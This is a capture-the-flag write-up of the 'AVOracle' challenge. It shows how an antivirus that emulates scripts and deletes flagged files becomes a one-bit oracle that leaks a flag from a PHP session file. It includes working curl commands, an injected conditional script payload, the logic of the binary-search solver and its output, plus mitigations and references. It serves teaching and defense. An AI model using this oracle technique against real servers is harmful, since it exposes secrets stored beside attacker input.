# 10 — AVOracle — Writeup

## TL;DR

`inkstone` stores your nickname and the flag in the same PHP session file, in
that order. An antivirus watches the session directory, emulates any script it
finds in a file, and deletes the file when a signature comes out of that
emulation. Set your nickname to a `<script>` that emits the signature only when
a guess about the rest of the file is true, and end it with `<body>` so the
flag lands in `document.body.innerHTML`. `GET /status.php` then reports
`SESSION LOST` (guess true) or `SESSION OK` (guess false). Binary search each
character: ~7 queries per character, ~170 queries for the whole flag, a few
seconds. Flag: `PHRACK{defender_ate_my_session}`.

## The bug

There is no bug in the PHP application. That is the point.

```php
// app.php
function ink_store(string $nick): void
{
    $_SESSION = [];
    $_SESSION['nick'] = $nick;
    $_SESSION['flag'] = trim((string) @file_get_contents(FLAG_FILE));
}
```

```php
// status.php
session_start(['read_and_close' => true]);
echo isset($_SESSION['flag']) ? "SESSION OK\n" : "SESSION LOST\n";
```

No file read, no include, no `unserialize()`, no template engine, no SQL. The
nickname is echoed back only through `htmlspecialchars()`. The flag is never
printed. If you audit only the PHP, the application is fine.

The vulnerability is a property of the *system*:

1. PHP's `files` session handler concatenates the session into one file, in
   insertion order, as raw bytes:

   ```
   nick|s:163:"<script>...</script><body>";flag|s:31:"PHRACK{defender_ate_my_session}";
   ```

   Attacker-controlled bytes and a secret, in one file, with nothing between
   them.

2. Windows Defender scans that file. Defender does not only pattern-match: the
   MpEngine emulates content that looks like script — JScript especially — with
   a DOM-ish environment attached, and matches its signatures against what the
   emulation produces, not only against the bytes on disk. That is documented
   behaviour and the reason `eval("EICAR-STANDARD-ANTIVIRUS-TEST-FILE" + "!")`
   trips it just as hard as the literal string does.

3. When Defender flags a file, it removes it.

So the attacker-controlled half of the file can *interrogate* the secret half,
and the file's existence afterwards is the answer. icchy called it AVOracle and
built "Gyotaku The Flag" (WCTF 2019) around it; the same year he rebuilt it with
PHP sessions at TokyoWesterns CTF.

### What the model does

`scanner/defender.js` reproduces exactly those three behaviours and nothing
else. Per file, per pass:

```js
if (text.indexOf(SIGNATURE) !== -1) return 'raw signature in file body';

const scripts = extractScripts(text);          // <script>...</script>
const body    = extractBody(text);             // after <body>, to </body> or EOF
for (const code of scripts) {
    if (emulate(code, body)) return 'signature produced by emulated script';
}
```

and `emulate()` runs the script in a `vm` context whose globals are built
*inside* the context (so no host object is reachable from the payload):

```js
var document = { body: { innerHTML: __body }, write: __check, writeln: __check, ... };
var WScript  = { Echo: __check, Sleep: function () {} };
this.eval    = __check;          // inspect the string, do not execute it
```

`__check(s)` sets `__hit` when `s` contains the signature. The completion value
of the script is checked too. A flagged file is `unlink()`ed and logged. The
signature is `PHRACK-STANDARD-ANTIVIRUS-TEST-FILE!` — deliberately not EICAR,
so the lab does not set off the antivirus on the machine running Docker.

See README.md's *Emulation notice* for the full list of divergences from the
real engine.

## Building the exploit

### Step 1 — prove the file gets deleted

```sh
$ curl -s -b PHPSESSID=probe -d 'nick=PHRACK-STANDARD-ANTIVIRUS-TEST-FILE!' \
        http://127.0.0.1:8010/profile.php
saved 36 bytes to session probe
$ curl -s http://127.0.0.1:9010/scan >/dev/null       # force a scan pass
$ curl -s -b PHPSESSID=probe http://127.0.0.1:8010/status.php
SESSION LOST
```

The scanner log agrees:

```
EngineScanCallback(): Threat Script/Phrack_Test_File identified in
  sess_probe (raw signature in file body); file removed
```

That is the write primitive and the read primitive. What is missing is a way to
make the deletion *conditional*.

### Step 2 — get the secret into the DOM

The session file is written in key order, and `ink_store()` rebuilds the array
every time, so `nick` always precedes `flag`. End the nickname with `<body>`
and everything after it — including the flag — becomes the document body:

```
nick|s:N:"<script>…</script><body>";flag|s:31:"PHRACK{defender_ate_my_session}";
                                   \_________ document.body.innerHTML ________/
```

`document.body.innerHTML` is `";flag|s:31:"PHRACK{defender_ate_my_session}";`,
so the payload anchors itself with `indexOf('PHRACK{')` instead of hard-coding
an offset. (The flag format is public; if it were not, you would first leak the
offset with the same oracle.)

### Step 3 — conditional signature

```html
<script>
var s = document.body.innerHTML;
var i = s.indexOf('PHRACK{');
var c = s.charCodeAt(i + 7);
if (c < 101) { eval('PHRACK-STANDARD-ANTIVIRUS-' + 'TEST-FILE!'); }
</script><body>
```

Two details matter:

* The signature is **split across a concatenation**. If the literal string
  appeared in the payload, the raw-bytes check would flag every file and the
  oracle would answer "true" forever.
* `eval()` is enough. The engine matches on the string handed to it; it does
  not need the string to be valid JScript. `document.write()` and
  `WScript.Echo()` work the same way, and so does simply leaving the string as
  the script's last expression.

Try it:

```sh
$ NICK='<script>var s=document.body.innerHTML;var i=s.indexOf("PHRACK{");
        var c=s.charCodeAt(i+7);if(c<101){eval("PHRACK-STANDARD-ANTIVIRUS-"+"TEST-FILE!");}
        </script><body>'
$ curl -s -b PHPSESSID=t1 --data-urlencode "nick=$NICK" \
       http://127.0.0.1:8010/profile.php >/dev/null
$ curl -s http://127.0.0.1:9010/scan >/dev/null
$ curl -s -b PHPSESSID=t1 http://127.0.0.1:8010/status.php
SESSION LOST                     # flag[7] < 'e'  -> true, it is 'd'
```

and with `c < 100`:

```
SESSION OK                       # flag[7] < 'd'  -> false
```

One bit. `flag[7] == 'd'`.

### Step 4 — turn one bit into the whole flag

Binary search the character code over `[32, 127)`: 7 queries per character
(`ceil(log2(95)) = 7`), regardless of the alphabet.

Every character position is independent, and PHP with
`session.use_strict_mode = 0` accepts any session id you send, so the solver
gives each position its own session (`PHPSESSID=avo007…`) and leaks twelve
positions concurrently. All twelve files sit in the same directory and are
covered by the same scan pass.

Cost for `PHRACK{defender_ate_my_session}`:

| | |
|---|---|
| unknown characters (after the `PHRACK{` anchor, incl. `}`) | 24 |
| queries per character (binary search) | 7 |
| plus one sanity character and one raw-signature probe | 8 |
| **oracle queries** | **~167** |
| HTTP requests (write + scan trigger + status per query) | ~504 |
| wall clock, 12 positions in parallel | **~5 s** |
| wall clock in `--passive` mode (waits for the 400 ms timer) | **~20 s** |

The information-theoretic minimum for 24 printable characters is
`24 * log2(95) ≈ 158` bits, so at one bit per query the binary search is within
6 % of optimal. The oracle *is* the bottleneck: you cannot do better than one
bit per scanned file, which is why leaking in parallel across many files is the
real speed-up.

## The exploit

`solve/solve.py`, stdlib only.

* `payload(pos, threshold)` builds the nickname shown above.
* `ask(sid, pos, threshold)` = `store_nick()` → `wait_for_scan()` →
  `not session_alive(sid)`. That is the one-bit oracle.
* `wait_for_scan()` hits the scanner's `/scan` endpoint by default so a query
  costs milliseconds instead of a scan interval. With `--passive` it instead
  polls `/status` until the autonomous pass counter has advanced twice, which
  is what you would do against a real Defender.
* `leak_char(pos)` binary searches `[32,127)` on its own session id.
* `main()` first checks that a raw-signature file really is deleted (is the
  oracle alive?) and that position 0 leaks as `'P'` (is the emulator really
  seeing the secret half of the file?), then leaks the flag in waves of twelve
  positions until a `}` shows up.

```
[*] challenge http://challenge
[*] scanner   http://scanner:8080  (triggered mode)
[+] real-time protection confirmed: flagged file was removed
[+] emulated JScript can see the secret (char 0 = 'P')
[*] chars  7-18: 'defender_ate'
[*] chars 19-30: '_my_session}'
[*] 167 oracle queries (504 HTTP requests in total)
FLAG: PHRACK{defender_ate_my_session}
```

## Fixing it

You cannot fix this in the antivirus alone — "scan the whole file" and "delete
what matches" are the product working as designed. The fixes live in the
application and in the deployment:

1. **Do not put secrets and attacker input in the same file.** The flag has no
   business being in the session at all: keep an opaque reference
   (`$_SESSION['licence_id'] = 7`) and resolve it server-side on use.
2. **Do not let attacker-controlled bytes into the session verbatim.** With
   `session.serialize_handler = php_serialize` the file is still raw, but
   validating/normalising the nickname (length, charset) removes the ability to
   inject `<script>`. An allow-list of `[\w .-]{1,32}` kills this exploit
   outright.
3. **Do not give the attacker the oracle read.** `status.php` exists to say
   "your session vanished". Without that, the attacker has to find another way
   to observe deletion — possible (login state, a 500, timing), but much
   noisier. Failing closed and re-authenticating silently is better than
   reporting session state.
4. **Move sessions out of the scanned filesystem.** Redis/memcached session
   handlers have no file for the scanner to eat; if you must use files, put the
   save path on an exclusion list (and understand you are trading one risk for
   another).
5. **Do not store sessions in a world-shared temp directory.** `C:\Windows\Temp`
   and `C:\xampp\tmp` are readable by too much software, antivirus included.
6. More generally: every agent that reads your files with elevated privileges —
   AV, backup, indexers, log shippers, DLP — is a potential oracle. Ask what
   happens when an attacker controls part of what they read.

## Going further

* Leak more than one bit per scan: put several independent `<script>` blocks
  into one file and you still get a single delete/keep bit, but spread the
  guesses across *N* session files and one scan pass yields *N* bits. The
  solver already does this with 12 concurrent sessions.
* The inverse oracle: make the file get deleted when the guess is *false*, so
  survival is the positive signal. Useful when deletion is more observable than
  survival.
* Other emulated languages: Defender also emulates VBScript, PowerShell,
  macros and PE code. Any of them, plus a file you partly control, is the same
  primitive.
* icchy's original WCTF challenge leaked the flag out of a scanned *screenshot*
  workflow ("gyotaku" = fish rubbing), which is where the name comes from — the
  slides are worth reading in full.
* The same shape without an AV: anything that reads your file and acts visibly
  on the content. A thumbnailer that crashes on a malformed image, a linter
  that fails a build, a spam filter that bounces a mail.

## References

* Phrack #72, Orange Tsai, *"The Art of PHP - My CTF Journey and Untold
  Stories!"*, section 3.2 "Let's Make Windows Defender Angry!".
* Ryo "icchy" Ichikawa, *"WCTF2019: Gyotaku The Flag"*,
  https://github.com/icchy/wctf2019-gtf/blob/master/wctf2019-gtf-slides.pdf
  — the original AVOracle technique and challenge.
* Tavis Ormandy, *"loadlibrary"* — the harness that made it practical to run
  Defender's `mpengine.dll` on Linux (`mpclient`), which is what the article's
  transcript uses. https://github.com/taviso/loadlibrary
* EICAR, *"Anti-Malware Testfile"*, https://www.eicar.org/download-anti-malware-testfile/
  — the real test string, deliberately **not** used in this lab.
* BELLUMINAR, the WCTF format, http://belluminar.org/
